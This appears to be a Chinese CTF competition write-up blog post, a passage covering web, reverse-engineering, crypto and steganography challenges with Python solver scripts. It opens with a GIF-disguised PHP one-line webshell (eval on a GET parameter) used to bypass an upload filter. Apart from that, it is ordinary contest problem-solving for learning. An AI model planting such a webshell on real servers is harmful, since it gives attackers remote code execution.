<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;aya&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>大概是这样，源代码成功之后被我删掉勒，甚至微软安全中心还报毒（<br>上传的时候还拦截了请求修改了一下后缀，不过后来看服务器里面似乎改没改后缀的都传进去了，大概是不改也没什么问题吧- -<br>不过修改背景图片也是挺好玩的<br>PS: 吐了，刚刚写这个 wp 的时候写到这里之后就看到文档时不时抽搐，时有时无，关掉重开之后文件居然就无了，还好做了备份，不然得吐血。后面试了一下，黏贴保存之后关掉再打开，文件又无了。换位置换名字都是这样，我都开始怀疑是不是 vscode 对 md 的支持有什么问题了。后来想到，刚刚我不是写了一句话木马嘛，想到之前微软安全中心给我报毒的事，寻思是不是微软安全中心给我删掉了。结果一看，好家伙，还真是，躺了一大堆“风险”文件，难绷了。</p>
<h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p>这题是比较早写的，一开始看到无法显示的字符的时候就觉得应该要用十六进制，然后我首先选择的是把收到的数据输出成文本，然后把十六进制格式写出来，再用 md5 计算，结果怎么算都不对，遂先放弃了<br>后面写完 <code>baby_typing_game</code> 之后，看到这题，就觉得: Why not Python? 于是用 python 开始写，主要也是对字符串要处理一下，除此之外就是一些进入流程，起名啊，看血量啊之类的，为了贴合流程基本上是写一点就连上去试下，大概也算是攻击服务器了（？<br>写完之后挂着机就睡午觉去了，醒来就发现血量都负数了还没结束。后来一问出题人，答曰看源码，才想起来还有源码，都忘记了（<br>一看，原来还要退出的，就是说还要检测到负血退出，算是加多点判断吧。还有就是可能是服务器问题还是怎么样，有时候消息会连在一起发送给我，直接导致我的 python 一直在 wait 信息，卡死了就，后面优化了一下，也不知道有没有起作用吧<br>如下是代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fd=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    fd.connect((<span class="string">&quot;124.***.**.***&quot;</span>,<span class="number">11111</span>)) <span class="comment"># 这里用星号隐去了原 IP</span></span><br><span class="line">    st=fd.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(st)</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    fd.settimeout(<span class="number">1</span>)</span><br><span class="line">    fd.send(<span class="string">&quot;1&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    fd.send(<span class="string">&quot;1&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">        <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">        fd.send(<span class="string">&quot;2&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">        st=fd.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(st,st[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span>(st[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        fd.send(<span class="string">&quot;1&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">        st=fd.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(st.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>))</span><br><span class="line">        st=st.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">        st=st[:st.find(<span class="string">&quot;\nyour&quot;</span>)].encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">        fd.send(hashlib.md5(st).hexdigest().encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">        </span><br><span class="line">    fd.send(<span class="string">&quot;3&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="sheep"><a href="#sheep" class="headerlink" title="sheep"></a>sheep</h3><p>游戏是羊了个羊翻版据说，但是我是没玩过的。自然是不可能玩游戏的，直接 F12，一开始还以为真的通过就行了，还寻思是不是要改 cookie，于是把记录里的第二关通过次数改成了 1，结果没反应。<br>后来直接一看源码才发现原来已经写着了:<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep2.png" alt="sheep2" loading="lazy"><br>于是跑了一下那串代码，发现是要 “hack brower”，一开始还以为是什么术语或者黑话，搜了一下但是没什么相关的。看到群里说需要什么伪造什么，我寻思就是 User-Agent 或者 cookie 吧，注意到网站每次都会把本地 cookie 中的 user 设为 guest，我寻思大概是脱不了关系的，但是用火狐的这个也没有反应，我还寻思是不是我什么没考虑到<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep0.png" alt="sheep0" loading="lazy"><br>后来写别的题目才发现，用这个发送根本不会刷新网页，感觉不如<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep1.png" alt="sheep1" loading="lazy"><br>于是用这个把 User-Agent 改为 hack 并且把 cookie 中的 user 改成 admin 后，成功获得了 flag<br>不过这些错误倒是一定程度上让我学到更多知识，甚至考虑到 hack 是不是要用 webshell 进去之类的- -，前面那道题能很快写出来大概也多亏了在这里提前有了解到吧。</p>
<h3 id="举报小黑子-鬼人正邪的挑战"><a href="#举报小黑子-鬼人正邪的挑战" class="headerlink" title="举报小黑子&amp;鬼人正邪的挑战"></a>举报小黑子&amp;鬼人正邪的挑战</h3><p>下午主要试了试这两题，不过都失败了。小黑子这题用了网上的 xss 平台，然而并没有反应，搞了好久也没什么进展，润了。<br>正邪这题，给了 1500 个碎片，然后每 30 个碎片有一个下划线，我猜测是每 30 个一行或者说一列之类的，最后把所有碎片拼起来这样子。于是用 React 写了一下，最后的结果是有点东西又有点不明所以的图片<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_Seija_seija1.png" alt="seija1" loading="lazy"><br>也试了改了各种参数和翻转之类的，都没有什么效果，于是只好忍痛放弃。</p>
<h3 id="hello-net"><a href="#hello-net" class="headerlink" title="hello_net"></a>hello_net</h3><p>实在别的题也没思路了，于是装了 IDA 去看了看 <code>Reverse Engineering</code> 的题。这道题还是比较舒适的，正如频道里说的，会用 IDA 就可以，flag 直接就写着了。</p>
<h3 id="secsome-cfg"><a href="#secsome-cfg" class="headerlink" title="secsome_cfg"></a>secsome_cfg</h3><p>按着解题人数做的，然后就是这题了。这题一开始也整不明白，hint 说的 cfg 我也没想明白是什么意思，只能想到之前AI画图的那个 <code>CFG Scale</code> 了（<br>后来就直接上 IDA，这流程也没看明白是什么意思，想着看看流程图的，结果 IDA 跟我说节点太多了，要调高上限才可以打开，后来把 <code>1000</code> 调到了 <code>100000</code>，终于打开了。不得不说确实是很震撼的，居然是能在流程图画图，不知道怎么做到的。<br>左下角就是 flag，但是我是真的看不清是什么&#x3D; &#x3D;<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_cfg_cfg0.png" alt="cfg0" loading="lazy"><br>最后三个单词大概猜出来是 <code>control flow graph</code>，也就是所说的 <code>cfg</code>，上面一个是 <code>secret</code>，然后最上面那个单词琢磨了好一会才想到原来是 <code>$(author)</code>，应该是要用作者替换。看到题目说明里还专门把出题人 <code>secsome</code> 标了出来，大概是八九不离十了。<br>当然最后还是因为眼瞎的问题试了好久 flag，以至于有 staff 在后台看不下去了，提醒了一下我 flag 有地方看错了，可是这真的看不清楚啊5555</p>
<h2 id="最终日"><a href="#最终日" class="headerlink" title="最终日"></a>最终日</h2><h3 id="typing-game-revange-AKA-baby-guess-me"><a href="#typing-game-revange-AKA-baby-guess-me" class="headerlink" title="typing_game_revange AKA baby_guess_me"></a>typing_game_revange AKA baby_guess_me</h3><p>这道题是 <code>baby_typing_game</code> 的升级版，666 次之后随机数就不给出了，需要自己计算。是找到一些说法的：<a target="_blank" rel="noopener" href="https://liam.page/2018/01/12/Mersenne-twister/">谈谈梅森旋转：算法及其爆破</a>，大概是 32 位数的话知道前 624 位之后就可以预测后面的数了，不过具体原理及方法我也没来得及看，是在网上偷的下面这位大哥的代码：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hacker_zrq/article/details/121419286">伪随机数之梅森旋转算法的逆向求解</a>。<br>然后具体操作的 py 代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mt <span class="keyword">import</span> * <span class="comment">#mt就是从上面那个博客拷贝的代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha</span>(<span class="params">origin:<span class="built_in">str</span>,ans:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    aaa=<span class="string">&quot;0123456789QWERTYUIOPLKJHGFDSAZXCVBNMqwertyuioplkjhgfdsazxcvbnm&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> aaa:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> aaa:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> aaa:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> aaa:</span><br><span class="line">                    test=a+b+c+d+origin</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256(test.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()==ans:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    mt=MT19937()</span><br><span class="line">    fd=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    fd.connect((<span class="string">&quot;124.***.**.***&quot;</span>,<span class="number">11115</span>)) <span class="comment"># 这里用星号隐去了原 IP</span></span><br><span class="line">    st=fd.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(st)</span><br><span class="line">    st=fd.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(st)</span><br><span class="line">    fd.settimeout(<span class="number">1</span>)</span><br><span class="line">    MTL=[]</span><br><span class="line">    fd.send(sha(st[st.find(<span class="string">&quot;+&quot;</span>)+<span class="number">1</span>:st.find(<span class="string">&quot;)&quot;</span>)],st[st.find(<span class="string">&quot;=&quot;</span>)+<span class="number">3</span>:st.find(<span class="string">&quot;\nGive&quot;</span>)]).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        st=fd.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="built_in">print</span>(st)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            st=fd.recv(<span class="number">1000</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            MTL.append(<span class="built_in">int</span>(st[st.find(<span class="string">&quot;.&quot;</span>)+<span class="number">2</span>:st.find(<span class="string">&quot;\nYo&quot;</span>)]))</span><br><span class="line">            <span class="built_in">print</span>(MTL[i])</span><br><span class="line">            fd.send(st[st.find(<span class="string">&quot;:&quot;</span>)+<span class="number">2</span>:st.find(<span class="string">&quot;\nYo&quot;</span>)].encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>,<span class="number">999</span>):</span><br><span class="line">        st=fd.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="built_in">print</span>(st)</span><br><span class="line">        predi=mt.predict(MTL[i-<span class="number">624</span>:i])</span><br><span class="line">        MTL.append(predi)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            st=fd.recv(<span class="number">1000</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            fd.send(<span class="string">f&quot;Mia is friendly. <span class="subst">&#123;MTL[i]&#125;</span>&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="built_in">print</span>(fd.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>本来以为 11:30 就结束了，后来到点一看，原来是 PM，于是就继续写了。这题我一开始确实不理解怎么会这么多人解出来，那么简单的吗？怎么写啊。翻了 html 文件也没有答案，然后这时候已经配备了 web 扫描工具，于是开扫，扫出来居然发现有个 <code>README.md</code>。打开来看了看，只见写的是 <code>Maybe there are something in css</code>………………<br>？<br>原来是找 css，最后是在 <code>index3.css</code> 找到了这串神秘代码 <code>bWF5Y3RmezBoX3lvM19jYTNfZjFuZF9pN30K</code> ，一开始以为这就是答案了，试了一下不对于是想到大概是 base64，成功解密。怪不得说可能有非预期解，大概不看 README 也是可以解的</p>
<h3 id="shape-secret"><a href="#shape-secret" class="headerlink" title="shape_secret"></a>shape_secret</h3><p>这题是新出的，本来看到有一个一页多的文档就退缩了，后来看到连着有两个人解出来，就觉得不太对劲，遂去看了一下文档。<br>注意看这里<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_shape_scr_0.png" alt="shape_secret0" loading="lazy"><br>有一个专有名词 <code>Westwood</code>，我一开始就想到那个制作命令与征服的游戏厂，但觉得不太对劲，寻思会不会还有别的意思，然而发现基本没有，于是又检索了一下另一个文件的后缀 <code>.shp</code> 和西木什么关系，发现这个大概是西木游戏里的一个特殊的图像文件格式。<br>那么可以大概推断，肯定是有相关的编辑器或者阅览器的。果不其然，有的：<a target="_blank" rel="noopener" href="https://github.com/LinKueiOminae/Image_Shaper">Image_Shaper</a>，于是下载下来就可以看了<br>不过这个<img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_shape_scr_1.png" alt="shape_secret1" loading="lazy">一开始还以为是 <code>θ</code> 来着&#x3D; &#x3D;</p>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>hint 也说得比较清楚了，要先用 <code>UPX</code> 脱壳，不过 4.0.0 的版本好像脱不了，得用 3.X 的版本。<br>其实应该是不用怎么读源码逻辑的<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_maze_0.png" alt="maze0" loading="lazy"><br>这些不明所以的字符其实每行分别排下来就是迷宫的样子，只要输入 <code>WASD</code> 能从左上角走到右下角并且不撞墙就行了，然后对输入取 sha256 就好了</p>
<h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><p>这题说是多语言混杂，但我觉得<del>还是暴露了你是个 go 吹，变着法子吹你那 go</del>基本上要看的运行逻辑的代码都是 go 写的，其他的基本都是干扰项。虽然不会 go，但还是能大概猜猜是什么意思的，不确定的也可以搜一下。<br>主体代码大概是这个：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">float main() &#123;</span><br><span class="line">	uint8_t key = GetKey();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*key=byte&#123;0b110001, 0b110100, 0b110001, 0b110101,</span></span><br><span class="line"><span class="comment">		0b111001, 0b110010, 0b110110, 0b110101,</span></span><br><span class="line"><span class="comment">		0b110011, 0b110101, 0b111000, 0b111001,</span></span><br><span class="line"><span class="comment">		0b110111, 0b111001, 0b110011, 0b110010,</span></span><br><span class="line"><span class="comment">		0b110011, 0b111000, 0b110100, 0b110110,</span></span><br><span class="line"><span class="comment">		0b110010, 0b110110, 0b110100, 0b110011,</span></span><br><span class="line"><span class="comment">		0b110011, 0b111000, 0b110011, 0b110010,</span></span><br><span class="line"><span class="comment">		0b110111, 0b111001, 0b110101, 0b110000&#125;*/</span></span><br><span class="line"></span><br><span class="line">	char[] encryptCode = GetCode();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*char&#123;0o111, 0o57, 0o157, 0o172, 0o163, 0o104,</span></span><br><span class="line"><span class="comment">		0o170, 0o66, 0o150, 0o111, 0o141, 0o115,</span></span><br><span class="line"><span class="comment">		0o146, 0o130, 0o132, 0o127, 0o160, 0o157,</span></span><br><span class="line"><span class="comment">		0o125, 0o120, 0o66, 0o115, 0o156, 0o126,</span></span><br><span class="line"><span class="comment">		0o165, 0o130, 0o162, 0o62, 0o116, 0o62,</span></span><br><span class="line"><span class="comment">		0o70, 0o142, 0o116, 0o62, 0o142, 0o125,</span></span><br><span class="line"><span class="comment">		0o127, 0o141, 0o141, 0o61, 0o150, 0o57,</span></span><br><span class="line"><span class="comment">		0o147, 0o155, 0o105, 0o107, 0o150, 0o113,</span></span><br><span class="line"><span class="comment">		0o172, 0o112, 0o104, 0o166, 0o131, 0o70,</span></span><br><span class="line"><span class="comment">		0o146, 0o132, 0o171, 0o155, 0o150, 0o102,</span></span><br><span class="line"><span class="comment">		0o172, 0o66, 0o107, 0o121&#125;*/</span></span><br><span class="line"></span><br><span class="line">	char[] decryptCode = AesDecrypt(encryptCode, key);</span><br><span class="line">	puts decryptCode;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释的部分是最后赋给 key 和 code 的值，其实内部就是绕了几层弯赋值，最后的解密函数是这样的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(cryted <span class="type">string</span>, key []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	crytedByte, _ := base64.StdEncoding.DecodeString(cryted)</span><br><span class="line"></span><br><span class="line">	block, _ := aes.NewCipher(key)</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	orig := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(crytedByte))</span><br><span class="line">	blockMode.CryptBlocks(orig, crytedByte)</span><br><span class="line">	orig = PKCS7UnPadding(orig)</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(orig)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要还是得看到先经过了一次 base64 解密，以及 Aes 的 iv 参数大概就是 key 的前 16 个字节<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_mix_0.png" alt="mix0" loading="lazy"><br>这样解密就可以出答案了</p>
<blockquote>
<p>这里忍不住后期插播一下，过了几个月，现在我已经学会 go 了，看到这些代码突然又有种莫名的感慨</p>
</blockquote>
<hr>
<p>至此，过了的 19 道题就都写完了，不得不说确实是很有意思的比赛。后面的团体赛我也参加了一下，不过只写了一道题。但是既然是以车万开始，那么也以车万作结吧</p>
<h2 id="EX"><a href="#EX" class="headerlink" title="EX"></a>EX</h2><h3 id="禁忌-四重存在"><a href="#禁忌-四重存在" class="headerlink" title="禁忌 四重存在"></a>禁忌 四重存在</h3><p>这题确实扣题了，这个文件里面总共存在着四个文件，分别是 png（源文件）、jpg、gif 以及 zip，不过按顺序来说，我是倒着把她们分离出来的。<br>首先是拉到最下面可以看到 zip 的文件尾，具体格式可以看这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43278826/article/details/118436116">压缩包Zip格式详析</a>，说的确实很好。这块就是把文件头的 <code>50 4b 03 04</code> 给替换掉了，改回来就可以分离了。<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_0.png" alt="flan0" loading="lazy"><br>关于怎么找到这块，我使用文件尾的偏移量计算的，不过看起来似乎会有更好的查找方法。如果分离出来解压不了，用工具修复一下就可以了。<br>解压出来是<code>禁忌-四重存在.tiff</code>，打不开，一开始以为是 tiff 文件头之类的格式问题，后来用 binwalk 一扫，感觉不简单了<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_1.png" alt="flan1" loading="lazy"><br>Zlib 文件，于是上网查找了一下该怎么做，发现用 python 提取解压挺方便的，<a target="_blank" rel="noopener" href="https://www.freesion.com/article/4333303676/">CTF 隐写 关于ZLIB的解压</a>，这个文章挺好的，关于思路上对我也有点启发。最后把前面不明所以的东西删掉后，用如下代码实现提取：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">datas=[<span class="number">0</span>,<span class="number">0x238F3</span>,<span class="number">0x4AC7B</span>,<span class="number">0x83B41</span>,<span class="number">0xDA011</span>,<span class="number">0x13D83D</span>,<span class="number">0x179333</span>,<span class="number">0x551551515151</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;E:\aldlss\Downloads\IDM\mix_secret\禁忌-四重存在.tiff&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:   <span class="comment">#当时是随便找了个目录写的题（</span></span><br><span class="line">    <span class="built_in">len</span>=<span class="built_in">len</span>(datas)</span><br><span class="line">    sum_data=f.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>-<span class="number">1</span>):</span><br><span class="line">        data=sum_data[datas[i]:datas[i+<span class="number">1</span>]]</span><br><span class="line">        now_data=zlib.decompress(data)</span><br><span class="line">        <span class="comment"># print(now_data)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">rf&quot;E:\aldlss\Downloads\IDM\mix_secret\&#123;i&#125;.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">            fw.write(now_data.<span class="built_in">hex</span>())</span><br><span class="line">            fw.close()</span><br></pre></td></tr></table></figure>
<p>提取出来是 6 个巨抽象的数字字符文本，随手截一段 <code>000fe000000fe010000ff000000fe010000ff000100ff010000ff000100fd000000fe010100feff0000fe000100fe010100ff010100fe000100feff0100f</code> 后面想了想，大概是十六进制编码，然后大概是 RGB 或者 RGBA 编码，每两个字符代表一个颜色值这样子。<br>把几个文档综合了起来，用 python 画了一下，调了各种大小和格式，总是是一些没什么意义的东西。最后看到源文件是 1467*1080 的。这个我熟啊，那串字符的总长度 12674880 就等于 1467*1080*4*8 啊，于是坚定了肯定有东西的想法，但横着画怎么都不对，最后才发现是竖着画；而且是倒着存储的，所以 RGBA 的值需要反着读，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paint</span>(<span class="params">width:<span class="built_in">int</span>,heigth:<span class="built_in">int</span>,channels:<span class="built_in">int</span>,file:<span class="built_in">str</span></span>):</span><br><span class="line">    img=Image.new(<span class="string">&quot;RGB&quot;</span> <span class="keyword">if</span> channels==<span class="number">3</span> <span class="keyword">else</span> <span 